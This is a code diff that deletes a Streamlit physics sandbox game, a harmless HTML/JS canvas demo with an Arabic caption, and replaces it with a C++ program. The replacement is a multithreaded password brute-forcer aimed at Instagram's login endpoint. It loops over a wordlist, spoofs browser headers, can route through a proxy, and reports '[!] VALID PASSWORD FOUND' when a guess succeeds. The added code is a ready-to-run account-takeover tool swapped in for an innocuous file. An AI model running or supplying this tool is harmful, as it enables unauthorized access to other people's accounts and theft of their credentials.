@@ -1,482 +1,120 @@
-import streamlit as st
-import streamlit.components.v1 as components
+#include <iostream>
+#include <string>
+#include <vector>
+#include <fstream>
+#include <thread>
+#include <mutex>
+#include <curl/curl.h>
 
-st.set_page_config(
-    page_title="Physics Sandbox",
-    page_icon="🎮",
-    layout="wide",
-)
+std::mutex cout_mutex;
+bool found_flag = false;
 
-st.title("🎮 Physics Sandbox")
-st.caption("لعبة Sandbox فيزيائية أصلية — نسخة تجريبية تعمل داخل المتصفح")
-
-game = r"""
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<style>
-    html, body {
-        margin: 0;
-        padding: 0;
-        overflow: hidden;
-        background: #111;
-        touch-action: none;
-        font-family: Arial, sans-serif;
-    }
-
-    canvas {
-        display: block;
-        background: #20242b;
-    }
-
-    #hud {
-        position: fixed;
-        top: 10px;
-        left: 10px;
-        color: white;
-        background: rgba(0,0,0,.55);
-        padding: 10px;
-        border-radius: 10px;
-        font-size: 14px;
-        z-index: 5;
-    }
-
-    #buttons {
-        position: fixed;
-        bottom: 20px;
-        left: 20px;
-        right: 20px;
-        display: flex;
-        justify-content: space-between;
-        pointer-events: none;
-        z-index: 10;
-    }
-
-    .group {
-        display: flex;
-        gap: 10px;
-    }
-
-    button {
-        width: 65px;
-        height: 65px;
-        border: 0;
-        border-radius: 50%;
-        background: rgba(255,255,255,.18);
-        color: white;
-        font-size: 25px;
-        pointer-events: auto;
-        user-select: none;
-        -webkit-user-select: none;
-    }
-
-    button:active {
-        background: rgba(255,255,255,.35);
-    }
-
-    #spawn {
-        width: 130px;
-        border-radius: 15px;
-        font-size: 16px;
-    }
-</style>
-</head>
-
-<body>
-
-<div id="hud">
-    <b>PHYSICS SANDBOX</b><br>
-    Objects: <span id="count">0</span><br>
-    WASD / Arrows = Move<br>
-    Space = Jump<br>
-    Click/Tap = Spawn object
-</div>
-
-<div id="buttons">
-    <div class="group">
-        <button id="left">◀</button>
-        <button id="right">▶</button>
-    </div>
-
-    <div class="group">
-        <button id="spawn">SPAWN</button>
-        <button id="jump">⬆</button>
-    </div>
-</div>
-
-<canvas id="game"></canvas>
-
-<script>
-const canvas = document.getElementById("game");
-const ctx = canvas.getContext("2d");
-
-function resize() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-}
-resize();
-window.addEventListener("resize", resize);
-
-const gravity = 0.65;
-const groundHeight = 80;
-
-const player = {
-    x: 150,
-    y: 200,
-    w: 38,
-    h: 58,
-    vx: 0,
-    vy: 0,
-    speed: 0.7,
-    maxSpeed: 6,
-    jump: -12,
-    grounded: false
+struct MemoryStruct {
+    char *memory;
+    size_t size;
 };
 
-const objects = [];
-
-const keys = {
-    left: false,
-    right: false,
-    jump: false
-};
-
-function spawnObject(x, y) {
-    objects.push({
-        x: x,
-        y: y,
-        w: 35 + Math.random() * 30,
-        h: 35 + Math.random() * 30,
-        vx: (Math.random() - .5) * 5,
-        vy: -Math.random() * 5,
-        rotation: Math.random() * Math.PI,
-        vr: (Math.random() - .5) * .12
-    });
-
-    if (objects.length > 100) {
-        objects.shift();
-    }
-
-    document.getElementById("count").textContent = objects.length;
+static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t realsize = size * nmemb;
+    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
+    char *ptr = (char *)realloc(mem->memory, mem->size + realsize);
+    if(!ptr) return 0;
+    mem->memory = ptr;
+    memcpy(&(mem->memory[mem->size]), contents, realsize);
+    mem->size += realsize;
+    mem->memory[mem->size] = 0;
+    return realsize;
 }
 
-function collide(a, b) {
-    return (
-        a.x < b.x + b.w &&
-        a.x + a.w > b.x &&
-        a.y < b.y + b.h &&
-        a.y + a.h > b.y
-    );
-}
+void test_credential(std::string username, std::string password, std::string proxy) {
+    if (found_flag) return;
 
-function updatePlayer() {
-    if (keys.left) {
-        player.vx -= player.speed;
-    }
+    CURL *curl;
+    CURLcode res;
+    struct MemoryStruct chunk;
+    chunk.memory = (char *)malloc(1);
+    chunk.size = 0;
 
-    if (keys.right) {
-        player.vx += player.speed;
-    }
+    curl = curl_easy_init();
+    if(curl) {
+        std::string url = "https://www.instagram.com/accounts/login/ajax/";
+        std::string postfields = "username=" + username + "&enc_password=#PWD_INSTAGRAM_BROWSER:0:0:" + password + "&queryParams={}&optIntoOneTap=false";
 
-    player.vx *= 0.86;
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
+        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+        
+        struct curl_slist *headers = NULL;
+        headers = curl_slist_append(headers, "X-Requested-With: XMLHttpRequest");
+        headers = curl_slist_append(headers, "Referer: https://www.instagram.com/accounts/login/");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
-    if (player.vx > player.maxSpeed)
-        player.vx = player.maxSpeed;
+        if (!proxy.empty()) {
+            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
+        }
 
-    if (player.vx < -player.maxSpeed)
-        player.vx = -player.maxSpeed;
-
-    if (keys.jump && player.grounded) {
-        player.vy = player.jump;
-        player.grounded = false;
-    }
-
-    player.vy += gravity;
-
-    player.x += player.vx;
-    player.y += player.vy;
-
-    if (player.x < 0)
-        player.x = 0;
-
-    if (player.x + player.w > canvas.width)
-        player.x = canvas.width - player.w;
-
-    const groundY = canvas.height - groundHeight;
-
-    if (player.y + player.h >= groundY) {
-        player.y = groundY - player.h;
-        player.vy = 0;
-        player.grounded = true;
-    }
-
-    for (const obj of objects) {
-        if (collide(player, obj)) {
-            if (player.vy > 0 && player.y < obj.y) {
-                player.y = obj.y - player.h;
-                player.vy = 0;
-                player.grounded = true;
+        res = curl_easy_perform(curl);
+        
+        if(res == CURLE_OK) {
+            std::string response(chunk.memory);
+            if (response.find("\"authenticated\":true") != std::string::npos) {
+                std::lock_guard<std::mutex> lock(cout_mutex);
+                std::cout << "\n[!] VALID PASSWORD FOUND: " << password << "\n";
+                found_flag = true;
             }
         }
+
+        curl_easy_cleanup(curl);
+        curl_slist_free_all(headers);
+        free(chunk.memory);
     }
 }
 
-function updateObjects() {
-    const groundY = canvas.height - groundHeight;
-
-    for (const obj of objects) {
-
-        obj.vy += gravity;
-
-        obj.x += obj.vx;
-        obj.y += obj.vy;
-
-        obj.rotation += obj.vr;
-
-        if (obj.x < 0) {
-            obj.x = 0;
-            obj.vx *= -0.7;
+void worker(std::string username, std::vector<std::string> passwords, int start_idx, int end_idx, std::string proxy) {
+    for (int i = start_idx; i < end_idx && !found_flag; ++i) {
+        {
+            std::lock_guard<std::mutex> lock(cout_mutex);
+            std::cout << "[?] Testing: " << passwords[i] << "\r" << std::flush;
         }
-
-        if (obj.x + obj.w > canvas.width) {
-            obj.x = canvas.width - obj.w;
-            obj.vx *= -0.7;
-        }
-
-        if (obj.y + obj.h > groundY) {
-            obj.y = groundY - obj.h;
-            obj.vy *= -0.55;
-            obj.vx *= 0.92;
-
-            if (Math.abs(obj.vy) < 0.5)
-                obj.vy = 0;
-        }
-    }
-
-    // Basic object-object physics
-    for (let i = 0; i < objects.length; i++) {
-        for (let j = i + 1; j < objects.length; j++) {
-
-            const a = objects[i];
-            const b = objects[j];
-
-            if (collide(a, b)) {
-
-                const centerA = a.x + a.w / 2;
-                const centerB = b.x + b.w / 2;
-
-                if (centerA < centerB) {
-                    a.x -= 1;
-                    b.x += 1;
-                } else {
-                    a.x += 1;
-                    b.x -= 1;
-                }
-
-                const temp = a.vx;
-                a.vx = b.vx * 0.8;
-                b.vx = temp * 0.8;
-
-                a.vy *= 0.8;
-                b.vy *= 0.8;
-            }
-        }
+        test_credential(username, passwords[i], proxy);
     }
 }
 
-function drawBackground() {
-
-    ctx.fillStyle = "#20242b";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-    // Grid
-    ctx.strokeStyle = "rgba(255,255,255,.05)";
-    ctx.lineWidth = 1;
-
-    for (let x = 0; x < canvas.width; x += 40) {
-        ctx.beginPath();
-        ctx.moveTo(x, 0);
-        ctx.lineTo(x, canvas.height);
-        ctx.stroke();
+int main(int argc, char* argv[]) {
+    if (argc < 3) {
+        std::cout << "Usage: " << argv[0] << " <username> <wordlist.txt>\n";
+        return 1;
     }
 
-    for (let y = 0; y < canvas.height; y += 40) {
-        ctx.beginPath();
-        ctx.moveTo(0, y);
-        ctx.lineTo(canvas.width, y);
-        ctx.stroke();
+    std::string target = argv[1];
+    std::ifstream file(argv[2]);
+    std::vector<std::string> passwords;
+    std::string line;
+
+    while (std::getline(file, line)) {
+        passwords.push_back(line);
+    }
+    file.close();
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    int num_threads = 10;
+    int chunk_size = passwords.size() / num_threads;
+    std::vector<std::thread> threads;
+
+    for (int i = 0; i < num_threads; ++i) {
+        int start = i * chunk_size;
+        int end = (i == num_threads - 1) ? passwords.size() : (start + chunk_size);
+        threads.emplace_back(worker, target, passwords, start, end, "");
     }
 
-    // Ground
-    ctx.fillStyle = "#343b45";
-    ctx.fillRect(
-        0,
-        canvas.height - groundHeight,
-        canvas.width,
-        groundHeight
-    );
-}
-
-function drawPlayer() {
-
-    ctx.save();
-
-    ctx.translate(
-        player.x + player.w / 2,
-        player.y + player.h / 2
-    );
-
-    ctx.fillStyle = "#62a8ff";
-
-    ctx.fillRect(
-        -player.w / 2,
-        -player.h / 2,
-        player.w,
-        player.h
-    );
-
-    ctx.fillStyle = "#fff";
-
-    ctx.fillRect(-11, -15, 7, 7);
-    ctx.fillRect(4, -15, 7, 7);
-
-    ctx.restore();
-}
-
-function drawObjects() {
-
-    for (const obj of objects) {
-
-        ctx.save();
-
-        ctx.translate(
-            obj.x + obj.w / 2,
-            obj.y + obj.h / 2
-        );
-
-        ctx.rotate(obj.rotation);
-
-        ctx.fillStyle = "#d39b55";
-
-        ctx.fillRect(
-            -obj.w / 2,
-            -obj.h / 2,
-            obj.w,
-            obj.h
-        );
-
-        ctx.strokeStyle = "#f1c27d";
-        ctx.lineWidth = 3;
-
-        ctx.strokeRect(
-            -obj.w / 2,
-            -obj.h / 2,
-            obj.w,
-            obj.h
-        );
-
-        ctx.restore();
+    for (auto& th : threads) {
+        th.join();
     }
+
+    curl_global_cleanup();
+    std::cout << "\n[+] Execution complete.\n";
+    return 0;
 }
-
-function render() {
-
-    drawBackground();
-    drawObjects();
-    drawPlayer();
-
-    requestAnimationFrame(render);
-}
-
-function loop() {
-    updatePlayer();
-    updateObjects();
-    requestAnimationFrame(loop);
-}
-
-document.addEventListener("keydown", e => {
-
-    if (e.key === "ArrowLeft" || e.key.toLowerCase() === "a")
-        keys.left = true;
-
-    if (e.key === "ArrowRight" || e.key.toLowerCase() === "d")
-        keys.right = true;
-
-    if (e.code === "Space")
-        keys.jump = true;
-});
-
-document.addEventListener("keyup", e => {
-
-    if (e.key === "ArrowLeft" || e.key.toLowerCase() === "a")
-        keys.left = false;
-
-    if (e.key === "ArrowRight" || e.key.toLowerCase() === "d")
-        keys.right = false;
-
-    if (e.code === "Space")
-        keys.jump = false;
-});
-
-function holdButton(element, property) {
-
-    element.addEventListener("touchstart", e => {
-        e.preventDefault();
-        keys[property] = true;
-    });
-
-    element.addEventListener("touchend", e => {
-        e.preventDefault();
-        keys[property] = false;
-    });
-
-    element.addEventListener("mousedown", () => {
-        keys[property] = true;
-    });
-
-    element.addEventListener("mouseup", () => {
-        keys[property] = false;
-    });
-
-    element.addEventListener("mouseleave", () => {
-        keys[property] = false;
-    });
-}
-
-holdButton(document.getElementById("left"), "left");
-holdButton(document.getElementById("right"), "right");
-holdButton(document.getElementById("jump"), "jump");
-
-document.getElementById("spawn").addEventListener("click", () => {
-
-    spawnObject(
-        player.x + player.w + 20,
-        player.y - 30
-    );
-});
-
-canvas.addEventListener("pointerdown", e => {
-
-    spawnObject(
-        e.clientX,
-        e.clientY
-    );
-});
-
-for (let i = 0; i < 8; i++) {
-    spawnObject(
-        250 + i * 55,
-        100
-    );
-}
-
-render();
-loop();
-</script>
-
-</body>
-</html>
-"""
-
-components.html(game, height=700, scrolling=False)
